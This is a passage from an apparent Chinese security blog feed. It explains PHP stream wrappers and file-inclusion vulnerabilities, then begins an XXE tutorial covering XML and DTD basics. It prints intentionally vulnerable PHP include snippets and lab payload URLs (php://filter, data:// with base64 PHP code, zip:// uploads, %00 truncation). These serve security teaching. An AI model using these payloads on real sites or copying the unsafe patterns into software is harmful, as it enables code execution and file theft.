因为最常用的参数是压缩等级，也可以提供一个整数值作为此参数（而不用数组）。</p></blockquote><p><strong>bzip2.compress和 bzip2.decompress</strong></p><blockquote><p>bzip2.compress过滤器接受以一个关联数组给出的最多两个参数：blocks是从 1 到 9 的整数值，指定分配多少个 100K 字节的内存块作为工作区。 work是 0 到 250 的整数值，指定在退回到一个慢一些，但更可靠的算法之前做多少次常规压缩算法的尝试。调整此参数仅影响到速度，压缩输出和内存使用都不受此设置的影响。将此参数设为 0 指示 bzip 库使用内部默认算法。 bzip2.decompress过滤器仅接受一个参数，可以用普通的布尔值传递，或者用一个关联数组中的small单元传递。当small设为&true; 值时，指示 bzip 库用最小的内存占用来执行解压缩，代价是速度会慢一些。</p></blockquote><h4 id="加密过滤器"><a href="#加密过滤器" class="headerlink" title="加密过滤器"></a>加密过滤器</h4><p>_mcrypt.<em>_和 _mdecrypt.</em>_使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持 mcrypt 扩展库中相同的算法，格式为_mcrypt.ciphername_，其中 ciphername是密码的名字，将被传递给 mcrypt_module_open()。有以下五个过滤器参数可用：</p><p>mcrypt 过滤器参数</p><table><thead><tr><th align="center">参数</th><th align="center">是否必须</th><th align="center">默认值</th><th align="center">取值举例</th><th></th><th></th></tr></thead><tbody><tr><td align="center">mode</td><td align="center">可选</td><td align="center">cbc</td><td align="center">cbc, cfb, ecb, nofb, ofb, stream</td><td></td><td></td></tr><tr><td align="center">algorithms_dir</td><td align="center">可选</td><td align="center">ini_get(‘mcrypt.algorithms_dir’)</td><td align="center">algorithms 模块的目录</td><td></td><td></td></tr><tr><td align="center">modes_dir</td><td align="center">可选</td><td align="center">ini_get(‘mcrypt.modes_dir’)</td><td align="center">modes 模块的目录</td><td></td><td></td></tr><tr><td align="center">iv</td><td align="center">必选</td><td align="center">N&#x2F;A</td><td align="center">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td><td></td><td></td></tr><tr><td align="center">key</td><td align="center">必选</td><td align="center">N&#x2F;A</td><td align="center">典型为 8，16 或 32 字节的二进制数据。根据密码而定</td><td></td><td></td></tr></tbody></table><p><strong>举例</strong></p><p>phpinfo.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;test test&quot;</span>;  </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_file_put_contents.asp">PHP file_put_contents() 函数</a></p><p>payload：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/phpinfo.php?a=php://filter/write=string.tolower/resource=test.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524202850271.png" alt="image-20200524202850271"></p><p>以base64的方式显示:</p><p>方法一:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><a href="http://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">PHP file_get_contents() 函数</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lab.l0ki.top/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524203309946.png" alt="image-20200524203309946"></p><p>方法二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&quot;test test&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;<span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/phpinfo.php?a=php://filter/convert.base64-encode/resource=test.php</span><br></pre></td></tr></table></figure><p><strong>双引号包含的变量$filename会被当作正常变量执行，而单引号包含的变量则会被当作字符串执行。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$aa</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$aa</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$aa&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-c75f4f31529e55fc.png" alt="图片.png"></p><h3 id="0x003-data-协议"><a href="#0x003-data-协议" class="headerlink" title="0x003 data:&#x2F;&#x2F;协议"></a>0x003 data:&#x2F;&#x2F;协议</h3><p>data:资源类型;编码,内容<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行</p><p>经过测试官方文档上存在一处问题，经过测试PHP版本5.2，5.3，5.5，7.0；data:&#x2F;&#x2F; 协议是是受限于allow_url_fopen的，官方文档上给出的是NO，所以要使用data:&#x2F;&#x2F;协议需要满足双on条件</p><blockquote><p>PHP.ini：<br>data:&#x2F;&#x2F;协议必须双在on才能正常使用；<br>allow_url_fopen ：on<br>allow_url_include：on<br>php 版本大于等于 php5.2</p></blockquote><p><strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">include $_GET[&#x27;file&#x27;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524230916588.png" alt="image-20200524230916588"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231000042.png" alt="image-20200524231000042"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=data:text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231107445.png" alt="image-20200524231107445"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524231147053.png" alt="image-20200524231147053"></p><h3 id="0x004-zip-bzip2-zlib-协议"><a href="#0x004-zip-bzip2-zlib-协议" class="headerlink" title="0x004 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议"></a>0x004 zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议</h3><p>PHP.ini：</p><blockquote><p>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;协议在双off的情况下也可以正常使用:<br>allow_url_fopen ：off&#x2F;on<br>allow_url_include：off&#x2F;on</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3个封装协议，都是直接打开压缩文件。</span><br><span class="line">compress.zlib://file.gz - 处理的是 &#x27;.gz&#x27; 后缀的压缩包</span><br><span class="line">compress.bzip2://file.bz2 - 处理的是 &#x27;.bz2&#x27; 后缀的压缩包</span><br><span class="line">zip://archive.zip#dir/file.txt - 处理的是 &#x27;.zip&#x27; 后缀的压缩包里的文件</span><br></pre></td></tr></table></figure><p><strong>zip:&#x2F;&#x2F;, bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F; 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</strong></p><h3 id="0x005-zip-协议"><a href="#0x005-zip-协议" class="headerlink" title="0x005 zip:&#x2F;&#x2F;协议"></a>0x005 zip:&#x2F;&#x2F;协议</h3><p>php 版本大于等于 php5.3.0<br>使用方法：<br><code>zip://archive.zip#dir/file.txt</code><br><strong>zip:&#x2F;&#x2F; [压缩文件绝对路径]#[压缩文件内的子文件名]</strong><br><strong>要用绝对路径+#(url编码,即为%23)</strong></p><p><strong>实例</strong></p><p>payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=zip:///www/wwwroot/lab.l0ki.top/file.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><ul><li>先创建一个phpinfo.txt文件,写入代码<code>&lt;?php phpinfo();?&gt;</code>  </li><li>再将这个文件压缩为file.zip进行上传</li><li><strong>若报错或上传失败，则将file.zip重命名为file.jpg即可</strong></li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200524232610258.png" alt="image-20200524232610258"></p><blockquote><p>由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23，且此处经过测试相对路径是不可行，所以只能用绝对路径。</p></blockquote><h3 id="0x006-bzip2-协议"><a href="#0x006-bzip2-协议" class="headerlink" title="0x006 bzip2:&#x2F;&#x2F;协议"></a>0x006 bzip2:&#x2F;&#x2F;协议</h3><p><strong>使用方法：</strong></p><p><code>compress.bzip2://file.bz2</code></p><p>相对路径也可以</p><p><strong>实例</strong></p><p>用7-zip生成一个bz2压缩文件。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://lab.l0ki.top/cmd.php?file=compress.bzip2:///www/wwwroot/lab.l0ki.top/file.jpg</span><br><span class="line"></span><br><span class="line">or</span><br><span class="line"></span><br><span class="line">http://lab.l0ki.top/cmd.php?file=compress.bzip2://./file.jpg</span><br></pre></td></tr></table></figure><h3 id="0x007-zlib-协议"><a href="#0x007-zlib-协议" class="headerlink" title="0x007 zlib:&#x2F;&#x2F;协议"></a>0x007 zlib:&#x2F;&#x2F;协议</h3><p><strong>使用方法：</strong></p><p><code>compress.zlib://file.gz</code></p><h2 id="0x02-文件包含漏洞"><a href="#0x02-文件包含漏洞" class="headerlink" title="0x02 文件包含漏洞"></a>0x02 文件包含漏洞</h2><h3 id="0x001-文件包含漏洞简介"><a href="#0x001-文件包含漏洞简介" class="headerlink" title="0x001 文件包含漏洞简介"></a>0x001 文件包含漏洞简介</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p>说白了就是引用一个文件。</p><h3 id="0x002-文件包含函数"><a href="#0x002-文件包含函数" class="headerlink" title="0x002 文件包含函数"></a>0x002 文件包含函数</h3><blockquote><p>文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file 。</p></blockquote><blockquote><p>常见的文件包含函数：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file，</p></blockquote><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h3 id="0x003-漏洞产生原因"><a href="#0x003-漏洞产生原因" class="headerlink" title="0x003 漏洞产生原因"></a>0x003 漏洞产生原因</h3><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>示例代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例如：</p><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><h3 id="0x004-两种问题"><a href="#0x004-两种问题" class="headerlink" title="0x004 两种问题"></a>0x004 两种问题</h3><p><strong>是否截断问题:</strong></p><p>情况一：不需要截断：</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>情况二：需要截断：</p><p>在php版本&lt;&#x3D;5.2中进行测试是可以使用%00截断的。</p><p>payload:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.php?file=file:///c:/users/Thinking/desktop/flag.txt%00</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].’.php’)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>allow_url_fopen与allow_url_include是否开启问题</strong></p><p>则追溯于以上的各种相关协议</p><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://blog.csdn.net/Ni9htMar3/article/details/69812306?locationNum=2&fps=1">php 伪协议</a></p><p><a href="http://www.freebuf.com/column/148886.html">php伪协议实现命令执行的七种姿势</a></p><p><a href="https://www.smi1e.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%B8%8Ephp%E4%BC%AA%E5%8D%8F%E8%AE%AE/">Smi1e</a></p><p><a href="https://www.freebuf.com/articles/web/182280.html">Web安全实战系列：文件包含漏洞</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>From Basics to Attack: XML Entity Injection</title>
      <link href="/2020/05/20/From-Basics-to-Attack-XML-Entity-Injection/"/>
      <url>/2020/05/20/From-Basics-to-Attack-XML-Entity-Injection/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>XXE是一种非常常见的漏洞类型，通常在web应用渗透中，成功利用的几率大。</p><p>本文主要从基础知识入手，引入重点，难点，误区，解决方法，实验方法，攻击方法，防御方法。</p><h2 id="0x02-XML"><a href="#0x02-XML" class="headerlink" title="0x02 XML"></a>0x02 XML</h2><h4 id="0x001-简介"><a href="#0x001-简介" class="headerlink" title="0x001 简介"></a>0x001 简介</h4><p><strong>XML 被设计用来结构化、存储以及传输信息。</strong></p><p><strong>HTML 被设计用来显示数据。</strong></p><h6 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h6><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<em>标记语言</em>，很类似 HTML</li><li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li><li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li><li>XML 被设计为具有<em>自我描述性</em>。</li><li>XML 是 <em>W3C 的推荐标准</em></li></ul><h6 id="XML-与-HTML-的主要差异"><a href="#XML-与-HTML-的主要差异" class="headerlink" title="XML 与 HTML 的主要差异"></a>XML 与 HTML 的主要差异</h6><ul><li>XML 不是 HTML 的替代。</li><li>XML 和 HTML 为不同的目的而设计：</li><li>XML 被设计为传输和存储数据，其焦点是数据的内容。</li><li>HTML 被设计用来显示数据，其焦点是数据的外观。</li><li>HTML 旨在显示信息，而 XML 旨在传输信息。</li><li>XML中的空格会被保留</li><li>XML的注释和HTML一样</li></ul><h6 id="对XML的特点的理解"><a href="#对XML的特点的理解" class="headerlink" title="对XML的特点的理解"></a>对XML的特点的理解</h6><p>不作为，纯文本，自定义</p><blockquote><p>xml文档仅仅是包装在 XML 标签中的纯粹的信息</p><p>我们需要编写软件或者程序，才能传送、接收和显示出这个文档</p><p>xml标签的功能性意义依赖于应用程序</p><p>在 HTML 中使用的标签（以及 HTML 的结构）是预定义的</p><p>XML中允许创作者定义自己的标签和自己的文档结构</p></blockquote><h6 id="XML用途"><a href="#XML用途" class="headerlink" title="XML用途"></a>XML用途</h6><ul><li><strong>XML 应用于 web 开发的许多方面，常用于简化数据的存储和共享。</strong></li><li><strong>XML 把数据从 HTML 分离</strong></li><li><strong>简化数据共享、数据传输、平台的变更</strong></li></ul><h4 id="0x002-树结构"><a href="#0x002-树结构" class="headerlink" title="0x002 树结构"></a>0x002 树结构</h4><p><strong>XML 文档形成了一种树结构，它从“根部”开始，然后扩展到“枝叶”。</strong></p><h6 id="文档实例"><a href="#文档实例" class="headerlink" title="文档实例"></a>文档实例</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第一行是 XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码 (ISO-8859-1 &#x3D; Latin-1&#x2F;西欧字符集)。</p><p>下一行描述文档的<em>根元素</em>（像在说：“本文档是一个便签”）：<code>&lt;note&gt;</code></p><p>接下来 4 行描述根的 4 个<em>子元素</em>（to, from, heading 以及 body）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后一行定义根元素的结尾：<code>&lt;/note&gt;</code></p><h6 id="文档形成树结构"><a href="#文档形成树结构" class="headerlink" title="文档形成树结构"></a>文档形成树结构</h6><p>XML 文档必须包含<em>根元素</em>。该元素是所有其他元素的父元素。</p><p>XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。</p><p>所有元素均可拥有子元素：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">child</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">subchild</span>&gt;</span>.....<span class="tag">&lt;/<span class="name">subchild</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">child</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>父、子以及同胞等术语用于描述元素之间的关系。父元素拥有子元素。相同层级上的子元素成为同胞（兄弟或姐妹）。</p><p>所有元素均可拥有文本内容和属性（类似 HTML 中）。</p><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/ct_nodetree1.gif" alt="img"></p><p>上图表示下面的 XML 中的一本书：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;bookstore&gt;</span><br><span class="line">&lt;book category=&quot;COOKING&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Everyday Italian&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;Giada De Laurentiis&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;30.00&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;book category=&quot;CHILDREN&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Harry Potter&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;J K. Rowling&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2005&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;29.99&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;book category=&quot;WEB&quot;&gt;</span><br><span class="line">  &lt;title lang=&quot;en&quot;&gt;Learning XML&lt;/title&gt; </span><br><span class="line">  &lt;author&gt;Erik T. Ray&lt;/author&gt; </span><br><span class="line">  &lt;year&gt;2003&lt;/year&gt; </span><br><span class="line">  &lt;price&gt;39.95&lt;/price&gt; </span><br><span class="line">&lt;/book&gt;</span><br><span class="line">&lt;/bookstore&gt;</span><br></pre></td></tr></table></figure><p>例子中的根元素是 <code>&lt;bookstore&gt;</code>。文档中的所有 <code>&lt;book&gt;</code> 元素都被包含在 <code>&lt;bookstore&gt;</code> 中。</p><p><code>&lt;book&gt;</code> 元素有 4 个子元素：<code>&lt;title&gt;</code>、<code>&lt; author&gt;</code>、<code>&lt;year&gt;</code>、<code>&lt;price&gt;</code>。</p><h4 id="0x003-语法"><a href="#0x003-语法" class="headerlink" title="0x003 语法"></a>0x003 语法</h4><p><strong>禁忌</strong></p><ul><li>所有 XML 元素都须有关闭标签</li><li>XML 标签对大小写敏感</li><li>XML 必须正确地嵌套</li><li>XML 文档必须有根元素</li><li>XML 的属性值须加引号</li></ul><h4 id="0x004-实体引用"><a href="#0x004-实体引用" class="headerlink" title="0x004 实体引用"></a>0x004 实体引用</h4><p>在 XML 中，一些字符拥有特殊的意义。</p><p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。</p><p>这样会产生 XML 错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &lt; 1000 then&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>为了避免这个错误，请用<em>实体引用</em>来代替 “&lt;” 字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;message&gt;if salary &amp;lt; 1000 then&lt;/message&gt; </span><br></pre></td></tr></table></figure><p>在 XML 中，有 5 个预定义的实体引用：</p><table><thead><tr><th>&lt;</th><th>&lt;</th><th>小于</th></tr></thead><tbody><tr><td>&gt;</td><td>&gt;</td><td>大于</td></tr><tr><td>&amp;</td><td>&amp;</td><td>和号</td></tr><tr><td>&apos;</td><td>‘</td><td>单引号</td></tr><tr><td>&quot;</td><td>“</td><td>引号</td></tr></tbody></table><p><strong>注释：</strong>在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p><h2 id="0x03-DTD"><a href="#0x03-DTD" class="headerlink" title="0x03 DTD"></a>0x03 DTD</h2><h4 id="0x001-简介-1"><a href="#0x001-简介-1" class="headerlink" title="0x001 简介"></a>0x001 简介</h4><blockquote><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。<br>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。<br>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</p><p>使用 DTD 来验证您自身的数据。</p><p>DTD（Document Type Definition文档类型定义）是一组机器可读的规则，它们定义XML或HTML的特定版本中允许有什么，不允许有什么。在解析网页时，浏览器将使用这些规则检查页面的有效性并且采取相应的措施。（由DTD中定义的文档类型影响）<br>DTD是对HTML文档声明，还会影响浏览器的渲染模式（工作模式）。（由页面中书写DTD的方式影响）</p></blockquote><p>简言之，DTD用来告诉浏览器你用的是什么标记语言</p><h6 id="内部的-DOCTYPE-声明"><a href="#内部的-DOCTYPE-声明" class="headerlink" title="内部的 DOCTYPE 声明"></a><strong>内部的 DOCTYPE 声明</strong></h6><p>DTD被包含在XML源中的表现声明形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h6 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a><strong>实例</strong></h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 